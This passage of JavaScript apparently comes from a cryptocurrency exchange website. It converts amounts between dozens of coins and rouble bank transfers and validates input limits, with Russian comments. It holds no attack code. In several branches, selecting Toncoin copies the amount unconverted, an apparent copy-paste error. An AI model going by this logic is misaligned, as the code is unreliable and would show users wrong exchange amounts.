                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_TON ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TON ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Dash (DASH)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_DASH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DASH ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_ZEC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ZEC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_BNB ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BNB ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Monero (XMR)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_XMR ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XMR ) / PRICE_XMR ).toFixed(2);
                    }

                }

            }

            if ( document.querySelector('.first__input-two').value == '' ) {
                document.querySelector('.first__input-one').value = '';
            }

            setTimeout( () => {
                document.querySelectorAll('.first__loading img')[0].style.display = 'none';
                document.querySelectorAll('.first__loading img')[1].style.display = 'none';
            }, 1000 )
        
        }

        getCurrencies();

    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

}

// Обработка введённых чисел на ввод и вывод

document.querySelector('.first__input-one').addEventListener('input', event => {

    document.querySelectorAll('.first__message')[0].style.display = 'none';
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';

    setTimeout( () => {
        
        if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
            if ( Number(document.querySelector('.first__input-one').value) < minLimitFirst ) {
                document.querySelectorAll('.first__message')[0].style.display = 'block';
                document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть больше ${minLimitFirst}`;
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            } else if ( Number(document.querySelector('.first__input-one').value) > maxLimitFirst ) {
                document.querySelectorAll('.first__message')[0].style.display = 'block';
                document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть меньше ${maxLimitFirst}`;
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            }

            if ( document.querySelector('.first__input-one').value == '' ) {
                document.querySelectorAll('.first__message')[0].style.display = 'none';
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';
            }
        } else if ( valuteCategoryFirst == 'CRYPTO' || valuteCategoryFirst == 'PAYSYSTEM' ) {
            if ( Number(document.querySelector('.first__input-one').value) < minLimitValuteFirst ) {
                document.querySelectorAll('.first__message')[0].style.display = 'block';
                document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть больше ${minLimitValuteFirst}`;
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
